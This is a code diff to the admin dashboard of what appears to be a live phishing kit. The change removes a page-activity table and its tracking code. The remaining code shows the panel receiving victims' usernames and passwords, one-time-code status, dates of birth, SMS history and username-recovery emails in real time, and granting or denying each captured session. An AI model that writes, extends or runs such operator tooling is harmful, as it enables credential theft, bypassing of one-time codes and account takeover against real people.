@@ -152,17 +152,6 @@
     </table>
   </div>
 
-  <div class="section-header">Page activity</div>
-  <div class="table-wrap">
-    <table>
-      <thead>
-        <tr><th>Page</th><th>Route</th><th>Visitors</th><th>Last accessed</th><th>Status</th></tr>
-      </thead>
-      <tbody id="pages-table">
-        <tr><td colspan="5"><div class="empty">No page activity yet.</div></td></tr>
-      </tbody>
-    </table>
-  </div>
 </main>
 
 <script>
@@ -171,7 +160,6 @@
   let reconnectTimer;
   let audioEnabled = true;
   let notificationsEnabled = false;
-  let pageActivity = [];
   const sessions = new Map();
 
   async function api(path, options) {
@@ -185,10 +173,9 @@
 
   async function loadSnapshot() {
     try {
-      const [requests, smsHistory, pages] = await Promise.all([
+      const [requests, smsHistory] = await Promise.all([
         api('/api/admin/pending'),
         api('/api/admin/sms-history'),
-        api('/api/admin/pages'),
       ]);
 
       sessions.clear();
@@ -211,9 +198,7 @@
         credStatus: 'grant',
         otpStatus: item.dateOfBirth ? 'grant' : 'waiting',
       }));
-      pageActivity = Array.isArray(pages) ? pages : [];
       renderRows();
-      renderPages();
       addLog('info', 'Admin data synchronized');
     } catch (error) {
       addLog('err', `Sync failed: ${error.message}`);
@@ -249,9 +234,7 @@
           password: request.password,
           credStatus: request.status || 'pending',
         }));
-        pageActivity = Array.isArray(msg.pages) ? msg.pages : pageActivity;
         renderRows();
-        renderPages();
         return;
       }
 
@@ -312,11 +295,7 @@
       }
 
       if (msg.type === 'page_activity' && msg.page) {
-        const index = pageActivity.findIndex(item => item.route === msg.page.route);
-        if (index >= 0) pageActivity[index] = msg.page;
-        else pageActivity.push(msg.page);
-        renderPages();
-        addLog('info', `${msg.page.pageName} visited`);
+        return;
       } else if (msg.type === 'username_recovery' && msg.data) {
         addLog('warn', `Username recovery: ${msg.data.email}`);
       }
@@ -413,26 +392,6 @@
         <td>${statusBadge(item.otpStatus, 'received')}</td>
       </tr>
     `).join('');
-  }
-
-  function renderPages() {
-    const tbody = document.getElementById('pages-table');
-    if (!pageActivity.length) {
-      tbody.innerHTML = '<tr><td colspan="5"><div class="empty">No page activity yet.</div></td></tr>';
-      return;
-    }
-    tbody.innerHTML = pageActivity
-      .slice()
-      .sort((a, b) => new Date(b.lastAccessed || 0) - new Date(a.lastAccessed || 0))
-      .map(page => `
-        <tr>
-          <td>${escHtml(page.pageName || '--')}</td>
-          <td class="mono">${escHtml(page.route || '--')}</td>
-          <td>${escHtml(page.visitors ?? 0)}</td>
-          <td class="mono">${escHtml(page.lastAccessed ? new Date(page.lastAccessed).toLocaleString() : '--')}</td>
-          <td>${statusBadge(page.status, 'active')}</td>
-        </tr>
-      `).join('');
   }
 
   async function decide(requestId, action) {
